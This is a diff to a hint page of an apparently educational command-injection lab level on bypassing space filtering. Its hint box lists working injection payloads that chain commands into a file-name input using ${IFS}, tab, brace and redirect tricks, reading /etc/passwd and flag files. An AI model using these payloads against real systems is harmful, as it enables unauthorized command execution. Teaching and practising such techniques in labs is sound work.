@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level 3 - Filter Bypass (Space)</title>
+    <title>Level 3 - Space Filter Bypass</title>
     <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🛡️ Level 3 - Filter Bypass (Space Filtering)</h1>
+            <h1>� Level 3 - Space Filter Bypass</h1>
             <p><strong>Objective:</strong> Bypass space character filtering để thực hiện command injection</p>
         </div>
 
@@ -120,13 +120,13 @@
                 </div>
                 <div id="hint-6" class="hint-box" style="display: none;">
                     <h4>🎯 Hint 6: Find the Flag!</h4>
-                    <p><strong>🚀 Target flag location:</strong> <code>/tmp/blind_flag.txt</code></p>
-                    <p><strong>Method 1 (IFS):</strong> <code>/etc/passwd;cat${IFS}/tmp/blind_flag.txt</code></p>
-                    <p><strong>Method 2 (IFS$9):</strong> <code>/etc/passwd;cat$IFS$9/tmp/blind_flag.txt</code></p>
-                    <p><strong>Method 3 (Tab):</strong> <code>/etc/passwd;cat%09/tmp/blind_flag.txt</code></p>
-                    <p><strong>Method 4 (Brace):</strong> <code>/etc/passwd;{cat,/tmp/blind_flag.txt}</code></p>
-                    <p><strong>Method 5 (Redirect):</strong> <code>/etc/passwd;cat&lt;/tmp/blind_flag.txt</code></p>
-                    <p><strong>💡 Exploration:</strong> <code>/etc/passwd;find${IFS}/tmp${IFS}-name${IFS}*flag*</code></p>
+                    <p><strong>🚀 Dynamic Flag Generation:</strong> Execute the flag generator</p>
+                    <p><strong>Method 1 (IFS):</strong> <code>/etc/passwd;/usr/local/bin/generate_flag.sh${IFS}3</code></p>
+                    <p><strong>Method 2 (IFS$9):</strong> <code>/etc/passwd;/usr/local/bin/generate_flag.sh$IFS$9 3</code></p>
+                    <p><strong>Method 3 (Tab):</strong> <code>/etc/passwd;/usr/local/bin/generate_flag.sh%09 3</code></p>
+                    <p><strong>Method 4 (Brace):</strong> <code>/etc/passwd;{/usr/local/bin/generate_flag.sh,3}</code></p>
+                    <p><strong>💡 Why dynamic?</strong> Flag contains current system info (user ID, etc.)</p>
+                    <p><strong>� Hint file:</strong> <code>/etc/passwd;cat${IFS}/var/flags/level3_cmd.txt</code></p>
                 </div>
             </div>
         </div>
